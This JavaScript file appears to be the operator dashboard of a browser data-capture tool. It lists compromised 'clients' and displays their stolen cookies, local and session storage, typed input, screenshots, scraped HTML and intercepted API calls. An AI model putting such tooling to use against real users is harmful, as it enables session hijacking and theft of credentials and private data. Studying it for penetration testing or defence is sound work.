let selectedClientId = "";




//  Support functions for nice presentation
// Copyright (C) 2011 by Will Tomlins
// 
// Github profile: http://github.com/layam
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.


function humanized_time_span(date, ref_date, date_formats, time_units) {
  //Date Formats must be be ordered smallest -> largest and must end in a format with ceiling of null
	date_formats = date_formats || {
		past: [
			{ ceiling: 60, text: "$seconds seconds ago" },
			{ ceiling: 3600, text: "$minutes minutes ago" },
			{ ceiling: 86400, text: "$hours hours ago" },
			{ ceiling: 2629744, text: "$days days ago" },
			{ ceiling: 31556926, text: "$months months ago" },
			{ ceiling: null, text: "$years years ago" }      
			],
		future: [
			{ ceiling: 60, text: "in $seconds seconds" },
			{ ceiling: 3600, text: "in $minutes minutes" },
			{ ceiling: 86400, text: "in $hours hours" },
			{ ceiling: 2629744, text: "in $days days" },
			{ ceiling: 31556926, text: "in $months months" },
			{ ceiling: null, text: "in $years years" }
			]
	};
  //Time units must be be ordered largest -> smallest
	time_units = time_units || [
		[31556926, 'years'],
		[2629744, 'months'],
		[86400, 'days'],
		[3600, 'hours'],
		[60, 'minutes'],
		[1, 'seconds']
		];

	date = new Date(date);
	ref_date = ref_date ? new Date(ref_date) : new Date();
	var seconds_difference = (ref_date - date) / 1000;

	var tense = 'past';
	if (seconds_difference < 0) {
		tense = 'future';
		seconds_difference = 0-seconds_difference;
	}

	function get_format() {
		for (var i=0; i<date_formats[tense].length; i++) {
			if (date_formats[tense][i].ceiling == null || seconds_difference <= date_formats[tense][i].ceiling) {
				return date_formats[tense][i];
			}
		}
		return null;
	}

	function get_time_breakdown() {
		var seconds = seconds_difference;
		var breakdown = {};
		for(var i=0; i<time_units.length; i++) {
			var occurences_of_unit = Math.floor(seconds / time_units[i][0]);
			seconds = seconds - (time_units[i][0] * occurences_of_unit);
			breakdown[time_units[i][1]] = occurences_of_unit;
		}
		return breakdown;
	}

	function render_date(date_format) {
		var breakdown = get_time_breakdown();
		var time_ago_text = date_format.text.replace(/\$(\w+)/g, function() {
			return breakdown[arguments[1]];
		});
		return depluralize_time_ago_text(time_ago_text, breakdown);
	}

	function depluralize_time_ago_text(time_ago_text, breakdown) {
		for(var i in breakdown) {
			if (breakdown[i] == 1) {
				var regexp = new RegExp("\\b"+i+"\\b");
				time_ago_text = time_ago_text.replace(regexp, function() {
					return arguments[0].replace(/s\b/g, '');
				});
			}
		}
		return time_ago_text;
	}

	return render_date(get_format());
}


// ********************************************************
//  Back to my code


var scrapedHtmlCode = "";







function showHtmlCode()
{
	prettyPrintCode = window.html_beautify(scrapedHtmlCode, {indent_size: 2});

	

// 	colorCoded = Prism.highlight(window.html_beautify(scrapedHtmlCode, {indent_size: 2})
// , Prism.languages.html);

	// colorCode = Prism.highlight(scrapedHtmlCode, Prism.languages.html)

	// cleanCode = Prism.highlight(window.html_beautify(scrapedHtmlCode, 
	// 	{indent_size: 2}), Prism.languages.html);


	 // function prettyPrintHtml(html) {
   //    // Format the HTML using js-beautify
   //    const formattedHtml = window.html_beautify(html, {
   //      indent_size: 2, // Number of spaces for indentation
   //    });


	modalContent = document.getElementById("code-viewer-body");
	modalContent.innerHTML = prettyPrintCode;
	// Prism.highlightElement(modalContent);

	var modal = new bootstrap.Modal(document.getElementById('codeModal'));
	modal.show();
}



function downloadHtmlCode(fileName)
{
	window.open(fileName, "_blank");
}



function showNoteEditor(client, nickname, notes)
{
	var modal      = new bootstrap.Modal(document.getElementById("noteEditorModal"));
	var noteTitle  = document.getElementById('note-editor-title');
	var noteEditor = document.getElementById('note-editor');
	var saveButton = document.getElementById('note-save-button');


	// Handle saving modified notes
	saveButton.onclick = function(event) {
		console.log("Saving note for: " + client);
		var newNotes = noteEditor.value;

		console.log("New notes value:");
		console.log(newNotes);

		encodedNotes = btoa(newNotes);

		// Send notes to server
		fetch('/api/updateClientNotes/' + client, {
			method:"POST",
			body: JSON.stringify({
				note: encodedNotes
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		});

		modal.hide();
		updateClients();
	};


	noteTitle.innerHTML = '<u>' + nickname + '</u> notes:';
	noteEditor.value = atob(notes);
	modal.show();
}



function showReqRespViewer(requestBody, responseBody)
{
	prettyRequest  = window.js_beautify(atob(responseBody), {indent_size: 2});
	prettyResponse = window.js_beautify(atob(responseBody), {indent_size: 2});

	requestContent = document.getElementById("requestBox");
	requestContent.innerHTML = prettyRequest;

	responseContent = document.getElementById("responseBox");
	responseContent.innerHTML = prettyResponse;


	var modal = new bootstrap.Modal(document.getElementById('requestResponseModal'));
	modal.show();
}

function showAboutModal()
{
	var modal = new bootstrap.Modal(document.getElementById("aboutModal"));
	modal.show();
}



function showGuideModal()
{
	var modal = new bootstrap.Modal(document.getElementById("guideModal"));
	modal.show();
}




async function getClientDetails(id) 
{
	console.log("** Fetching details for client: " + id);

	// Get high level event stack for client
	var req = await fetch('/api/clientEvents/' + id);
	var jsonResponse = await req.json();

	// Start setting up our cards
	var cardStack = document.getElementById('detail-stack');


	// Let's get event details for each event
	for (let i = 0; i < jsonResponse.length; i++)
	{
		event = jsonResponse[i];
		var eventKey = event.eventID;

		var card = document.createElement('div');
		card.className ='card';

		var cardBody = document.createElement('div');
		cardBody.className = 'card-body';

		var cardTitle = document.createElement('h5');
		cardTitle.className = "card-title";

		var cardSubtitle = document.createElement('h6');

		// Add tooltip
		cardSubtitle.className = "card-subtitle mb-2 text-muted";
		cardSubtitle.setAttribute("data-toggle", "tooltip")
		cardSubtitle.setAttribute("title", event.timeStamp);
		cardSubtitle.setAttribute("data-placement", "left");
		const tooltipOptions = {
    	animation: true, // Optional: Enable tooltip animation
      delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
      container: cardSubtitle // Optional: Specify a container for the tooltip
    };
    new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


    var cardText = document.createElement('p');
    cardText.className = 'card-text';



		// Handle event specific details and formatting
    switch(event.eventType)
    {
    case 'COOKIE':
    	cookieReq  = await fetch('/api/clientCookie/' + eventKey);
    	cookieJson = await cookieReq.json();

    	cardTitle.innerHTML = "Cookie";
    	cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
    	cardText.innerHTML += "<br>";
    	cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
    	break;

    case 'LOCALSTORAGE':
    	localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
    	localStorageJson = await localStorageReq.json();

			// console.log("*** Local storage api call received: ");
			// console.log(JSON.stringify(localStorageJson));

    	cardTitle.innerHTML = "Local Storage";
    	cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
    	cardText.innerHTML += "<br>";
    	cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
    	break;

    case 'SESSIONSTORAGE':
    	sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
    	sessiontorageJson  = await sessionStorageReq.json();

    	cardTitle.innerHTML = "Session Storage";
    	cardText.innerHTML  = "Key: <b>" + sessiontorageJson.sessionStorageKey + "</b>";
    	cardText.innerHTML += "<br>";
    	cardText.innerHTML += "Value: <b>" + sessiontorageJson.sessionStorageValue + "</b>";
    	break;

    case 'URLVISITED':
    	urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
    	urlVisitedJson = await urlVisitedReq.json();

    	cardTitle.innerHTML = "<u>URL Visited</u>";
    	cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
    	break;

    case 'HTML':
    	htmlScrapeReq  = await fetch('/api/clientHtml/' + eventKey);
    	htmlScrapeJson = await htmlScrapeReq.json();

			// Dump it in a variable. So many issues trying to pass this code in generated HTML lol
    	scrapedHtmlCode = htmlScrapeJson.code;

    	cardTitle.innerHTML = "HTML Scraped";
    	cardText.innerHTML  = "URL: <b>" + htmlScrapeJson.url + "</b><br><br>";
    	cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showHtmlCode()">View Code</button>';
    	cardText.innerHTML += '&nbsp;<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + htmlScrapeJson.fileName + `'`+ ')>Download Code</button>';
    	break;

    case 'SCREENSHOT':
    	screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
    	screenshotJson = await screenshotReq.json();

    	cardTitle.innerHTML = "Screenshot Captured";
    	cardText.innerHTML  = '<a href="'  + screenshotJson.fileName + '" target="_blank"><img src="' + screenshotJson.fileName + '" class="img-thumbnail"></a>';
    	break;

    case 'USERINPUT':
    	userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
    	userInputJson = await userInputReq.json();

    	cardTitle.innerHTML = "User Input";
    	cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
    	cardText.innerHTML += "<br>";
    	cardText.innerHTML += "Typed Value: <b>" + userInputJson.inputValue + "</b>";
    	break;


    	case 'XHROPEN':
    		xhrOpenReq  = await fetch('/api/clientXhrOpen/' + eventKey);
    		xhrOpenJson = await xhrOpenReq.json();

    		cardTitle.innerHTML = "API - XHR Open";
    		cardText.innerHTML  = "URL: <b>" + xhrOpenJson.url + "</b>";
      	cardText.innerHTML += "<br>";
     		cardText.innerHTML += "Method: <b>" + xhrOpenJson.method + "</b>";
    		break;

    	case 'XHRSETHEADER':
    		xhrHeaderReq  = await fetch('/api/clientXhrSetHeader/' + eventKey);
    		xhrHeaderJson = await xhrHeaderReq.json();

    		cardTitle.innerHTML = "API - XHR Set Header";
    		cardText.innerHTML  = "Header: <b>" + xhrHeaderJson.header + "</b>";
      	cardText.innerHTML += "<br>";
     		cardText.innerHTML += "Method: <b>" + xhrHeaderJson.value + "</b>";
    		break;

    	case 'XHRCALL':
    		xhrCallReq  = await fetch('/api/clientXhrCall/' + eventKey);
    		xhrCallJson = await xhrCallReq.json();

    		requestData  = xhrCallJson.requestBody;
    		responseData = xhrCallJson.responseBody;

    		cardTitle.innerHTML = "API - XHR Call";
    		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' + `'` 
    			+ xhrCallJson.requestBody + `','` + xhrCallJson.responseBody  + `'`+ ')>View API Call</button>';

    		break;

    default:
    	alert('!!!!Switch default-No good');
    }

    cardSubtitle.innerHTML = humanized_time_span(event.timeStamp);

    cardBody.appendChild(cardTitle);
    cardBody.appendChild(cardSubtitle);
    cardBody.appendChild(cardText);

    card.appendChild(cardBody);

    cardStack.appendChild(card);
  }
}





function unselectAllClients()
{
	// Remove detail cards
	detailCardStack = document.getElementById('detail-stack');
	while (detailCardStack.firstChild)
	{
		detailCardStack.firstChild.remove();
	}

	// Unselect client cards
	clientCardStack = document.getElementById('client-stack');
	var cards = clientCardStack.querySelectorAll('.card');
	for (let i = 0; i < cards.length; i++)
	{
		cards[i].classList.remove("table-active");
	}
}




async function updateClients()
{
	// Get client info
	var req = await fetch('/api/getClients');
	var jsonResponse = await req.json();

	// Start setting up the client cards
	var cardStack = document.getElementById('client-stack');

	// First clear out our existing cards
	while (cardStack.firstChild)
	{
		cardStack.firstChild.remove();
	}


	// let's layout our clients
	for (let i = 0; i < jsonResponse.length; i++)
	{
		client = jsonResponse[i];

		var card = document.createElement('div');
		card.className = 'card';
		card.setAttribute("clientIndex", client.id);
		card.setAttribute("id", "clientCard" + client.id);

		// On refresh, see if we were the previously
		// selected client and re-select

		// console.log("Selected ID: " + selectedClientId + ", current client id: " + client.id);
		if (client.id == selectedClientId)
		{
			card.classList.add("table-active");
		}


		var cardBody = document.createElement('div');
		cardBody.className = 'card-body';

		var cardTitle = document.createElement('h5');
		cardTitle.className = "card-title";

		var cardSubtitle = document.createElement('h6');

		// Add tooltip
		cardSubtitle.className = "card-subtitle mb-2 text-muted";
		cardSubtitle.setAttribute("data-toggle", "tooltip")
		cardSubtitle.setAttribute("title", "Last Update: " + client.lastSeen);
		cardSubtitle.setAttribute("data-placement", "left");
		const tooltipOptions = {
    	animation: true, // Optional: Enable tooltip animation
      delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
      container: cardSubtitle // Optional: Specify a container for the tooltip
    };
    new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


    var cardText = document.createElement('p');
    cardText.className = 'card-text';

    cardTitle.innerHTML = "<u>" + client.nickname + "</u>";



    cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b><br>";
		//What to do about client notes?
    if (client.notes.length > 0)
    {
    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` 
    	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Edit Notes</button>';
    }
    else
    {
    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` 
    	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Add Notes</button>';
    }

    cardText.innerHTML += "Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
    cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";

    cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
    cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";


    cardBody.appendChild(cardTitle);
    cardBody.appendChild(cardSubtitle);
    cardBody.appendChild(cardText);

    card.appendChild(cardBody);

    card.onclick =  function(event) {
    	unselectAllClients();
    	clickedClient = this.getAttribute("clientIndex");
    	this.classList.add("table-active");
    	selectedClientId = clickedClient;
    	getClientDetails(selectedClientId);
    };

    cardStack.appendChild(card);
  }
}




// Every 2 seconds...
setInterval(updateClients, 5000);

updateClients();